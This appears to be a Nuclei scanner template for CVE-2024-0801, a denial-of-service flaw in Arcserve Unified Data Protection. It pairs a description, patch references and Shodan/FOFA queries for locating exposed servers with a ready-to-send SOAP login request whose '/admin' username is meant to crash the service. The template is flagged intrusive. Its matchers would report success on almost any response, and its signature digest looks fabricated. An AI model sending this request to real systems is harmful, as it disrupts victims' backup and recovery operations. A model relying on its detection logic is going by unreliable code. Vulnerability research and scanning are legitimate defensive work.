id: CVE-2024-0801

info:
  name: Arcserve UDP - Unauthenticated Denial of Service
  author: pdresearch
  severity: high
  description: |
    A denial of service vulnerability exists in Arcserve Unified Data Protection (UDP) versions 9.2 and 8.1 in the ASNative.dll component. When logging in to the Arcserve UDP Console with the validateUserByUser API call, the login username is processed by code in ASNative.dll. If the username starts with \ or /, the value 0 is passed as the second parameter to wcsncpy_s(), which triggers the invalid parameter handler that terminates the process.
  impact: |
    An unauthenticated remote attacker can crash the Arcserve UDP service, causing a denial of service condition that disrupts backup and recovery operations.
  remediation: |
    Apply the appropriate security patches - Arcserve UDP 9.2: Patch P00003050, Arcserve UDP 8.1: Patch P00003059.
  reference:
    - https://www.tenable.com/security/research/tra-2024-07
    - https://nvd.nist.gov/vuln/detail/CVE-2024-0801
    - https://support.arcserve.com/s/article/Critical-vulnerability-alert-Arcserve-Unified-Data-Protection-UDP-Security-Fix-update-CVE-2024-0799-CVE-2024-0800-CVE-2024-0801
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cve-id: CVE-2024-0801
    cwe-id: CWE-476
    epss-score: 0.00042
    epss-percentile: 0.08068
    cpe: cpe:2.3:a:arcserve:unified_data_protection:*:*:*:*:*:*:*:*
  metadata:
    verified: false
    max-request: 1
    vendor: arcserve
    product: unified_data_protection
    shodan-query:
      - http.favicon.hash:"-1889244460"
      - port:8015
    fofa-query: icon_hash="-1889244460"
  tags: cve,cve2024,arcserve,udp,dos,unauth,intrusive

variables:
  dos_payload: "/admin"

http:
  - raw:
      - |
        POST /management/services/EdgeServiceConsoleImpl HTTP/1.1
        Host: {{Hostname}}:8015
        Content-Type: text/xml; charset=utf-8
        SOAPAction: ""

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.edge.arcserve.ca.com/">
          <soapenv:Header/>
          <soapenv:Body>
            <web:validateUserByUser>
              <arg0>{{dos_payload}}</arg0>
              <arg1>password</arg1>
              <arg2></arg2>
            </web:validateUserByUser>
          </soapenv:Body>
        </soapenv:Envelope>

    unsafe: true
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "validateUserByUserResponse"
          - "soap:Envelope"
        condition: or

      - type: word
        part: body
        words:
          - "Connection refused"
          - "Connection reset"
        condition: or

      - type: regex
        part: body
        regex:
          - "(?i)(arcserve|asnative|edge.*service)"
# digest: 4a0a00473045022100d7f2e8b9c4a3f5e6d8c9b2a1f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0b102207f8e9d0c1b2a3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8c9a0b1f2e3d4c5b6a7:922c64590222798bb761d5b6d8e72950